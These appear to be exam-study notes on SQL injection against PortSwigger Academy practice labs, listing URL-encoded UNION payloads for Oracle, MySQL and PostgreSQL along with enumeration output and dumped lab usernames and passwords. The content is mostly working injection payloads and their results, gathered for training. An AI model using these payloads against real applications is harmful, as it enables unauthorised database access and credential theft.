# bscp
## basic extraction
### oracle
```
Pets'+or+'1'%3d'1
Pets'+or+'1'%3d'1'--
Pets'+or+'1'%3d'1'+order+by+2--
Pets'+union+select+null,null+from+dual--
Pets'+union+select+banner,null+from+v$version--
```
### mysql
```
Pets'+or+'1'%3d'1'#
Pets'+or+'1'%3d'1'+order+by+2#
Pets'+union+select+null,null#
Pets'+union+select+version(),null#
```
### general - use comment and version() to try and determine database - this one turned out to be postgresql
```
# initial enum
Pets'+or+'1'%3d'1'--
Pets'+or+'1'%3d'1'+order+by+2--
Pets'+union+select+null,null--
Pets'+union+select+version(),null--

PostgreSQL 12.13 (Ubuntu 12.13-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit

# all databases
Pets'+union+select+datname,'nada'+from+pg_database--

postgres
academy_labs
template1
template0

# current database
Pets'+union+select+current_database(),'nada'+from+pg_database--

academy_labs

# tables in specific database
Pets'+union+select+table_name,'nada'+from+information_schema.tables+where+database_name='academy_labs'--

error <<-- to list tables / do anything on another database, need to use DBlink

# tables in current database
Pets'+union+select+tablename,'nada'+from+pg_catalog.pg_tables--

sql_languages
pg_opfamily
pg_database
pg_operator
pg_shdepend
pg_user_mapping
pg_aggregate
pg_shseclabel
pg_sequence
pg_foreign_table
pg_statistic
pg_db_role_setting
pg_type
pg_seclabel
pg_index
pg_subscription_rel
pg_range
pg_foreign_data_wrapper
pg_attrdef
pg_replication_origin
pg_ts_parser
pg_authid
pg_auth_members
users_ftxqoe


# another way - results are slightly different
Pets'+union+select+table_name,'nada'+from+information_schema.tables--

column_privileges
pg_stat_sys_tables
pg_stat_progress_vacuum
pg_policies
foreign_servers
pg_opfamily
pg_operator
table_constraints
attributes
pg_shdepend
pg_aggregate
users_ftxqoe
products
administrable_role_authorizations
user_mappings
domains
foreign_server_options
column_column_usage
collations
pg_user
routines

# columns
Pets'+union+select+column_name,'nada'+from+information_schema.columns+where+table_name='users_fmnebg'--

password_nruxzf
username_wdkxnv

# pwn
Pets'+union+select+concat(username_wdkxnv,':',password_nruxzf),'nada'+from+users_fmnebg--

carlos:01znvxvuiqopwydfln92
wiener:mdcn7w1my9mdpnoc0l6m
administrator:7qpk90futuka5actprm7
```
